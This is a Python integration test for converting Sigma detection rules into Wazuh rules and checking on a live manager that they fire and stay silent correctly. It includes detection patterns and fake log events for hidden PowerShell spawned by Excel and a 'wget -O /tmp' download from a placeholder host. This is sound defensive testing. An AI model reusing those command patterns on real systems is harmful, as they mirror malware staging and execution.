#!/usr/bin/env python3
"""Sigma convertida rodando em um gerenciador Wazuh real. Requer infra/subir.sh e root.

    /opt/panthera-roar/venv/bin/python testes/fase4/testar_sigma.py [--base PASTA_COM_REGRAS]

Carrega as regras no gerenciador, valida a configuração e confere com a ferramenta de teste
do próprio Wazuh se elas disparam quando devem e calam quando devem.
"""

import json
import subprocess
import sys
import time
import uuid
from pathlib import Path

import urllib3

RAIZ = Path(__file__).resolve().parents[2]
sys.path[:0] = [str(RAIZ / "ingestao"), str(RAIZ / "testes/fase1")]

from roar_ingestao import provisao  # noqa: E402
from roar_ingestao.sigma import arquivo_de_regras, converter_textos  # noqa: E402
from testar_ingestao import Ambiente, api_do, esperar_gerenciador  # noqa: E402

urllib3.disable_warnings()
RESULTADOS = []

REGRA_POWERSHELL = """
title: PowerShell escondido iniciado pelo Excel
id: 0b4a4a2e-1111-4c1c-9d2e-000000000001
status: test
logsource: {category: process_creation, product: windows}
detection:
  selecao:
    ParentImage|endswith: '\\\\excel.exe'
    Image|endswith: ['\\\\powershell.exe', '\\\\pwsh.exe']
    CommandLine|contains|all: ['-w', 'hidden']
  excecao:
    User: 'AUTORIDADE NT\\\\SISTEMA'
  condition: selecao and not excecao
level: high
tags: [attack.execution, attack.t1059.001]
"""
REGRA_OU = """
title: Conta criada ou apagada
id: 0b4a4a2e-1111-4c1c-9d2e-000000000002
status: test
logsource: {product: windows, service: security}
detection:
  criada: {EventID: 4720}
  apagada: {EventID: 4726}
  condition: criada or apagada
level: medium
"""
REGRA_LINUX = """
title: Download para o tmp seguido de execucao
id: 0b4a4a2e-1111-4c1c-9d2e-000000000003
status: test
logsource: {product: linux, service: syslog}
detection:
  palavras: ['wget -O /tmp/roarcarga']
  condition: palavras
level: high
"""
INCONVERTIVEL = """
title: Compara numero
status: test
logsource: {product: windows, service: security}
detection:
  s: {SubjectLogonId|cidr: '10.0.0.0/8'}
  condition: s
level: low
"""


def registrar(nome, passou, detalhe=""):
    RESULTADOS.append((nome, bool(passou)))
    print(f"[{'PASSOU' if passou else 'FALHOU'}] {nome}" + (f": {detalhe}" if detalhe else ""), flush=True)


def sysmon(imagem, pai, linha, usuario="EMPRESA\\maria", marca=""):
    return json.dumps({"win": {
        "system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
                   "severityValue": "INFORMATION", "message": "Process Create", "computer": "PC1"},
        "eventdata": {"image": imagem, "parentImage": pai, "commandLine": linha, "user": usuario, "processGuid": marca},
    }})


def seguranca(evento, marca=""):
    return json.dumps({"win": {
        "system": {"providerName": "Microsoft-Windows-Security-Auditing", "eventID": str(evento), "channel": "Security",
                   "severityValue": "AUDIT_SUCCESS", "message": "Evento", "computer": "PC1"},
        "eventdata": {"targetUserName": marca},
    }})


INJETOR = """
import socket, sys
s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
s.connect("/var/ossec/queue/sockets/queue")
s.send(("1:" + sys.argv[1] + ":" + sys.stdin.read()).encode())
"""


CARGA = """
import socket, sys
s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
s.connect("/var/ossec/queue/sockets/queue")
m = ("1:EventChannel:" + sys.argv[1]).encode()
for _ in range(int(sys.argv[2])):
    s.send(m)
"""


def _no_gerenciador(g, *comando, entrada=None):
    conteiner = f"roar-ger-{g['id']}-gerenciador-1"
    return subprocess.run(["docker", "exec", "-i", conteiner, *comando], input=entrada, capture_output=True, text=True, timeout=120)


def regra_disparada(g, evento, marca, local="EventChannel", espera=20):
    """Entrega o evento na fila do gerenciador, como um agente faria, e lê os alertas gerados."""
    entrega = _no_gerenciador(g, "/var/ossec/framework/python/bin/python3", "-c", INJETOR, local, entrada=evento)
    if entrega.returncode:
        raise RuntimeError(entrega.stderr[-300:])
    fim, achados = time.monotonic() + espera, []
    while time.monotonic() < fim:
        saida = _no_gerenciador(g, "grep", "-a", marca, "/var/ossec/logs/alerts/alerts.json").stdout
        achados = [json.loads(linha) for linha in saida.splitlines() if linha.strip()]
        if achados:
            break
        time.sleep(1)
    return [a["rule"]["description"] for a in achados], achados


def main():
    amb = Ambiente()
    try:
        g = amb.gerenciador("sigma")
        registrar("gerenciador no ar", esperar_gerenciador(g))

        amostra = api_do(g, "GET", "/rules", params={"rule_ids": "5712"})["data"]["affected_items"][0]
        print("   formato real da regra:", json.dumps({k: amostra.get(k) for k in ("id", "level", "groups", "mitre", "pci_dss", "gdpr", "hipaa", "nist_800_53", "tsc", "gpg13", "filename", "status")}, ensure_ascii=False)[:600], flush=True)

        print("\n== Regras de exemplo", flush=True)
        exemplos = converter_textos([REGRA_POWERSHELL, REGRA_OU, REGRA_LINUX, INCONVERTIVEL])
        registrar("três regras convertem", all(r.xml for r in exemplos[:3]), str([len(r.xml) for r in exemplos]))
        registrar("o que não dá para expressar é recusado com motivo", not exemplos[3].xml and exemplos[3].motivo, exemplos[3].motivo)

        extras = []
        if "--base" in sys.argv:
            pasta = Path(sys.argv[sys.argv.index("--base") + 1])
            textos = [a.read_text(encoding="utf-8") for a in sorted(pasta.rglob("*.yml"))]
            # Ids depois dos exemplos, para os dois conjuntos conviverem no mesmo arquivo.
            extras = converter_textos(textos, id_inicial=210000)
            aceitas = [r for r in extras if r.xml]
            registrar("base pública convertida", len(aceitas) / max(len(extras), 1) >= 0.8,
                      f"{len(aceitas)} de {len(extras)} regras, {sum(len(r.xml) for r in aceitas)} regras do Wazuh")

        print("\n== Regra ruim não derruba o gerenciador", flush=True)
        ruim = '<group name="sigma,"><rule id="200000" level="5"><field name="x" type="pcre2">(</field><description>r</description></rule></group>\n'
        aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", ruim)
        registrar("regex inválido é recusado na validação", not aceito, json.dumps(detalhe)[:200])
        registrar("gerenciador segue válido depois da recusa", provisao._configuracao_valida(g["id"])[0])

        xml = arquivo_de_regras(exemplos)
        aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", xml)
        registrar("configuração válida com as regras de exemplo", aceito, json.dumps(detalhe)[:400])
        time.sleep(30)
        registrar("gerenciador volta depois de carregar", esperar_gerenciador(g, 240))
        total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
        registrar("regras de exemplo carregadas", total == 3, f"{total} regras")

        print("\n== Dispara quando deve e cala quando deve", flush=True)
        titulo = "PowerShell escondido iniciado pelo Excel"
        powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        excel = "C:\\Program Files\\Office\\EXCEL.EXE"

        def processo(imagem, pai, linha, **extra):
            marca = f"marca{uuid.uuid4().hex}"
            return regra_disparada(g, sysmon(imagem, pai, linha, marca=marca, **extra), marca)

        descricoes, alertas = processo(powershell, excel, "powershell -w hidden -enc AAAA")
        registrar("ataque dispara a regra convertida", titulo in descricoes, str(descricoes))
        tecnicas = [t for a in alertas for t in a["rule"].get("mitre", {}).get("id", [])]
        registrar("técnica MITRE chega ao alerta", "T1059.001" in tecnicas, str(tecnicas))
        # Só vale se o evento gerou algum alerta: senão não prova que a regra calou.
        descricoes, _ = processo(powershell, "C:\\Windows\\explorer.exe", "powershell -w hidden")
        registrar("outro processo pai não dispara", descricoes and titulo not in descricoes, str(descricoes))
        descricoes, _ = processo(powershell, excel, "powershell -w minimized")
        registrar("falta de um termo não dispara", descricoes and titulo not in descricoes, str(descricoes))
        descricoes, _ = processo(powershell, excel, "powershell -w hidden", usuario="AUTORIDADE NT\\SISTEMA")
        registrar("exceção cala a regra", descricoes and titulo not in descricoes, str(descricoes))
        descricoes, _ = processo("C:\\Windows\\System32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
                                 "c:\\program files\\office\\excel.exe", "POWERSHELL -W HIDDEN")
        registrar("não diferencia maiúsculas, como o Sigma", titulo in descricoes, str(descricoes))

        for evento in (4720, 4726):
            marca = f"marca{uuid.uuid4().hex}"
            descricoes, _ = regra_disparada(g, seguranca(evento, marca), marca)
            registrar(f"evento {evento} dispara o ramo do OU", "Conta criada ou apagada" in descricoes, str(descricoes))
        marca = f"marca{uuid.uuid4().hex}"
        descricoes, _ = regra_disparada(g, seguranca(4624, marca), marca, espera=10)
        registrar("outro evento não dispara", "Conta criada ou apagada" not in descricoes, str(descricoes))

        marca = f"marca{uuid.uuid4().hex}"
        linha = f"Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/roarcarga http://exemplo.test/{marca}"
        descricoes, _ = regra_disparada(g, linha, marca, local="/var/log/syslog")
        registrar("palavra-chave em log Linux dispara", "Download para o tmp seguido de execucao" in descricoes, str(descricoes))
        marca = f"marca{uuid.uuid4().hex}"
        descricoes, _ = regra_disparada(g, f"Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/outra {marca}", marca,
                                        local="/var/log/syslog", espera=8)
        registrar("texto parecido em log Linux não dispara", "Download para o tmp seguido de execucao" not in descricoes, str(descricoes))

        if extras:
            print("\n== Base pública inteira", flush=True)
            inicio = time.monotonic()
            aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", arquivo_de_regras(exemplos + extras))
            registrar("configuração válida com a base inteira", aceito, json.dumps(detalhe)[:300])
            registrar("gerenciador volta com a base inteira", esperar_gerenciador(g, 300), f"{time.monotonic() - inicio:.0f}s")
            total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
            registrar("base inteira carregada", total >= sum(len(r.xml) for r in exemplos + extras), f"{total} regras")
            inicio, descricoes = time.monotonic(), []
            while time.monotonic() - inicio < 300 and titulo not in descricoes:
                descricoes, _ = processo(powershell, excel, "powershell -w hidden")
            registrar("ataque dispara com a base inteira", titulo in descricoes, f"{time.monotonic() - inicio:.0f}s, {descricoes[:4]}")
            # Vazão real do gerenciador com a base inteira carregada.
            marca = f"marca{uuid.uuid4().hex}"
            lote, inicio = 2000, time.monotonic()
            _no_gerenciador(g, "/var/ossec/framework/python/bin/python3", "-c", CARGA,
                            sysmon(powershell, excel, "powershell -w hidden", marca=marca), str(lote))
            fim, contados = time.monotonic() + 180, 0
            while time.monotonic() < fim and contados < lote:
                contados = int(_no_gerenciador(g, "grep", "-a", "-c", marca, "/var/ossec/logs/alerts/alerts.json").stdout.strip() or 0)
                time.sleep(2)
            duracao = time.monotonic() - inicio
            print(f"   carga: {contados} alertas de {lote} eventos em {duracao:.0f}s, cerca de {contados / max(duracao, 1):.0f} por segundo", flush=True)
            memoria = subprocess.run(["docker", "stats", "--no-stream", "--format", "{{.Name}} {{.MemUsage}}"],
                                     capture_output=True, text=True).stdout
            print("   memória:", [l for l in memoria.splitlines() if g["id"] in l], flush=True)
    finally:
        amb.limpar()

    falhas = [n for n, ok in RESULTADOS if not ok]
    print(f"\n{len(RESULTADOS) - len(falhas)} de {len(RESULTADOS)} passaram.")
    for n in falhas:
        print(f"  falhou: {n}")
    return 1 if falhas else 0


if __name__ == "__main__":
    sys.exit(main())
